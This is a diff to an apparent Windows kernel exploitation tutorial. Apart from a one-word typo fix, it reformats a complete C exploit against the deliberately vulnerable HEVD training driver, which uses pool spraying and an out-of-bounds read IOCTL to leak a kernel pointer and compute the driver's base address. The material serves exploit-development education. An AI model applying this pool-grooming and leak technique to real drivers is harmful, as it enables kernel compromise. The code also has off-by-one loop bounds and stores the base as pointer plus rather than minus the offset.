@@ -99,7 +99,7 @@ Let's take a look at the file in HEVD called `MemoryDisclosureNonPagedPoolNx.c`.
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/pool11.png" alt="">
 
-The above snippet of code is a function which is defined as `TriggerMemoryDisclosureNonPagedPoolNx`. This function has a return type of `NTSTATUS`. This code invokes `ExAllocatePoolWithTag` and creates a pool chunk on the `NonPagedPoolNx` kernel pool of size `POOL_BUFFER_SIZE` and with the pool tage `POOL_TAG`. Tracing the value of `POOL_BUFFER_SIZE` [in `MemoryDisclosureNonPagedPoolNx.h`, which is included in the `MemoryDisclosureNonPagedPoolNx.c` file](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/win10-klfh/Driver/HEVD/Windows/MemoryDisclosureNonPagedPoolNx.h), we can see that the pool chunk allocated here is `0x70` bytes in size. `POOL_TAG` is also included in [`Common.h`](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/win10-klfh/Driver/HEVD/Windows/Common.h) as `kcaH`, which is more humanly readable as `Hack`.
+The above snippet of code is a function which is defined as `TriggerMemoryDisclosureNonPagedPoolNx`. This function has a return type of `NTSTATUS`. This code invokes `ExAllocatePoolWithTag` and creates a pool chunk on the `NonPagedPoolNx` kernel pool of size `POOL_BUFFER_SIZE` and with the pool tag `POOL_TAG`. Tracing the value of `POOL_BUFFER_SIZE` [in `MemoryDisclosureNonPagedPoolNx.h`, which is included in the `MemoryDisclosureNonPagedPoolNx.c` file](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/win10-klfh/Driver/HEVD/Windows/MemoryDisclosureNonPagedPoolNx.h), we can see that the pool chunk allocated here is `0x70` bytes in size. `POOL_TAG` is also included in [`Common.h`](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/win10-klfh/Driver/HEVD/Windows/Common.h) as `kcaH`, which is more humanly readable as `Hack`.
 
 After the pool chunk is allocated in the `NonPagedPoolNx` it is filled with `0x41` characters, `0x70` of them to be precise, as seen in the call to `RtlFillMemory`. There is no vulnerability here yet, as nothing so far is influenced by a client invoking an IOCTL which would reach this routine. Let's continue down the code to see what happens.
 
@@ -357,159 +357,159 @@ The final code can be seen below.
 // Fill the holes in the NonPagedPoolNx of 0x80 bytes
 void memLeak(HANDLE driverHandle)
 {
-	// Array to manage handles opened by CreateEventA
-	HANDLE eventObjects[5000];
+  // Array to manage handles opened by CreateEventA
+  HANDLE eventObjects[5000];
 
-	// Spray 5000 objects to fill the new page
-	for (int i = 0; i <= 5000; i++)
-	{
-		// Create the objects
-		HANDLE tempHandle = CreateEventA(
-			NULL,
-			FALSE,
-			FALSE,
-			NULL
-		);
+  // Spray 5000 objects to fill the new page
+  for (int i = 0; i <= 5000; i++)
+  {
+    // Create the objects
+    HANDLE tempHandle = CreateEventA(
+      NULL,
+      FALSE,
+      FALSE,
+      NULL
+    );
 
-		// Assign the handles to the array
-		eventObjects[i] = tempHandle;
-	}
+    // Assign the handles to the array
+    eventObjects[i] = tempHandle;
+  }
 
-	// Check to see if the first handle is a valid handle
-	if (eventObjects[0] == NULL)
-	{
-		printf("[-] Error! Unable to spray CreateEventA objects! Error: 0x%lx\n", GetLastError());
-		exit(-1);
-	}
-	else
-	{
-		printf("[+] Sprayed CreateEventA objects to fill holes of size 0x80!\n");
+  // Check to see if the first handle is a valid handle
+  if (eventObjects[0] == NULL)
+  {
+    printf("[-] Error! Unable to spray CreateEventA objects! Error: 0x%lx\n", GetLastError());
+    exit(-1);
+  }
+  else
+  {
+    printf("[+] Sprayed CreateEventA objects to fill holes of size 0x80!\n");
 
-		// Close half of the handles
-		for (int i = 0; i <= 5000; i += 2)
-		{
-			BOOL tempHandle1 = CloseHandle(
-				eventObjects[i]
-			);
+    // Close half of the handles
+    for (int i = 0; i <= 5000; i += 2)
+    {
+      BOOL tempHandle1 = CloseHandle(
+        eventObjects[i]
+      );
 
-			eventObjects[i] = NULL;
+      eventObjects[i] = NULL;
 
-			// Error handling
-			if (!tempHandle1)
-			{
-				printf("[-] Error! Unable to free the CreateEventA objects! Error: 0x%lx\n", GetLastError());
-				exit(-1);
-			}
-		}
+      // Error handling
+      if (!tempHandle1)
+      {
+        printf("[-] Error! Unable to free the CreateEventA objects! Error: 0x%lx\n", GetLastError());
+        exit(-1);
+      }
+    }
 
-		printf("[+] Poked holes in the new pool page!\n");
+    printf("[+] Poked holes in the new pool page!\n");
 
-		// Allocate UaF Objects in place of the poked holes by just invoking the IOCTL, which will call ExAllocatePoolWithTag for a UAF object
-		// kLFH should automatically fill the freed holes with the UAF objects
-		DWORD bytesReturned;
+    // Allocate UaF Objects in place of the poked holes by just invoking the IOCTL, which will call ExAllocatePoolWithTag for a UAF object
+    // kLFH should automatically fill the freed holes with the UAF objects
+    DWORD bytesReturned;
 
-		for (int i = 0; i < 2500; i++)
-		{
-			DeviceIoControl(
-				driverHandle,
-				0x00222053,
-				NULL,
-				0,
-				NULL,
-				0,
-				&bytesReturned,
-				NULL
-			);
-		}
+    for (int i = 0; i < 2500; i++)
+    {
+      DeviceIoControl(
+        driverHandle,
+        0x00222053,
+        NULL,
+        0,
+        NULL,
+        0,
+        &bytesReturned,
+        NULL
+      );
+    }
 
-		printf("[+] Allocated objects containing a pointer to HEVD in place of the freed CreateEventA objects!\n");
+    printf("[+] Allocated objects containing a pointer to HEVD in place of the freed CreateEventA objects!\n");
 
-		// Close the rest of the event objects
-		for (int i = 1; i <= 5000; i += 2)
-		{
-			BOOL tempHandle2 = CloseHandle(
-				eventObjects[i]
-			);
+    // Close the rest of the event objects
+    for (int i = 1; i <= 5000; i += 2)
+    {
+      BOOL tempHandle2 = CloseHandle(
+        eventObjects[i]
+      );
 
-			eventObjects[i] = NULL;
+      eventObjects[i] = NULL;
 
-			// Error handling
-			if (!tempHandle2)
-			{
-				printf("[-] Error! Unable to free the rest of the CreateEventA objects! Error: 0x%lx\n", GetLastError());
-				exit(-1);
-			}
-		}
+      // Error handling
+      if (!tempHandle2)
+      {
+        printf("[-] Error! Unable to free the rest of the CreateEventA objects! Error: 0x%lx\n", GetLastError());
+        exit(-1);
+      }
+    }
 
-		// Array to store the buffer (output buffer for DeviceIoControl) and the base address
-		unsigned long long outputBuffer[100];
-		unsigned long long hevdBase;
+    // Array to store the buffer (output buffer for DeviceIoControl) and the base address
+    unsigned long long outputBuffer[100];
+    unsigned long long hevdBase;
 
-		// Everything is now, theoretically, [FREE, UAFOBJ, FREE, UAFOBJ, FREE, UAFOBJ], barring any more randomization from the kLFH
-		// Fill some of the holes, but not all, with vulnerable chunks that can read out-of-bounds (we don't want to fill up all the way to avoid reading from a page that isn't mapped)
+    // Everything is now, theoretically, [FREE, UAFOBJ, FREE, UAFOBJ, FREE, UAFOBJ], barring any more randomization from the kLFH
+    // Fill some of the holes, but not all, with vulnerable chunks that can read out-of-bounds (we don't want to fill up all the way to avoid reading from a page that isn't mapped)
 
-		for (int i = 0; i <= 100; i++)
-		{
-			// Return buffer
-			DWORD bytesReturned1;
+    for (int i = 0; i <= 100; i++)
+    {
+      // Return buffer
+      DWORD bytesReturned1;
 
-			DeviceIoControl(
-				driverHandle,
-				0x0022204f,
-				NULL,
-				0,
-				&outputBuffer,
-				sizeof(outputBuffer),
-				&bytesReturned1,
-				NULL
-			);
+      DeviceIoControl(
+        driverHandle,
+        0x0022204f,
+        NULL,
+        0,
+        &outputBuffer,
+        sizeof(outputBuffer),
+        &bytesReturned1,
+        NULL
+      );
 
-		}
+    }
 
-		printf("[+] Successfully triggered the out-of-bounds read!\n");
+    printf("[+] Successfully triggered the out-of-bounds read!\n");
 
-		// Parse the output
-		for (int i = 0; i <= 100; i++)
-		{
-			// Kernel mode address?
-			if ((outputBuffer[i] & 0xfffff00000000000) == 0xfffff00000000000)
-			{
-				printf("[+] Address of function pointer in HEVD.sys: 0x%llx\n", outputBuffer[i]);
-				printf("[+] Base address of HEVD.sys: 0x%llx\n", outputBuffer[i] - 0x880CC);
+    // Parse the output
+    for (int i = 0; i <= 100; i++)
+    {
+      // Kernel mode address?
+      if ((outputBuffer[i] & 0xfffff00000000000) == 0xfffff00000000000)
+      {
+        printf("[+] Address of function pointer in HEVD.sys: 0x%llx\n", outputBuffer[i]);
+        printf("[+] Base address of HEVD.sys: 0x%llx\n", outputBuffer[i] - 0x880CC);
 
-				// Store the variable for future usage
-				hevdBase = outputBuffer[i] + 0x880CC;
-				break;
-			}
-		}
-	}
+        // Store the variable for future usage
+        hevdBase = outputBuffer[i] + 0x880CC;
+        break;
+      }
+    }
+  }
 }
 
 void main(void)
 {
-	// Open a handle to the driver
-	printf("[+] Obtaining handle to HEVD.sys...\n");
+  // Open a handle to the driver
+  printf("[+] Obtaining handle to HEVD.sys...\n");
 
-	HANDLE drvHandle = CreateFileA(
-		"\\\\.\\HackSysExtremeVulnerableDriver",
-		GENERIC_READ | GENERIC_WRITE,
-		0x0,
-		NULL,
-		OPEN_EXISTING,
-		0x0,
-		NULL
-	);
+  HANDLE drvHandle = CreateFileA(
+    "\\\\.\\HackSysExtremeVulnerableDriver",
+    GENERIC_READ | GENERIC_WRITE,
+    0x0,
+    NULL,
+    OPEN_EXISTING,
+    0x0,
+    NULL
+  );
 
-	// Error handling
-	if (drvHandle == (HANDLE)-1)
-	{
-		printf("[-] Error! Unable to open a handle to the driver. Error: 0x%lx\n", GetLastError());
-		exit(-1);
-	}
-	else
-	{
-		memLeak(drvHandle);
-	}
+  // Error handling
+  if (drvHandle == (HANDLE)-1)
+  {
+    printf("[-] Error! Unable to open a handle to the driver. Error: 0x%lx\n", GetLastError());
+    exit(-1);
+  }
+  else
+  {
+    memLeak(drvHandle);
+  }
 }
 
 ```
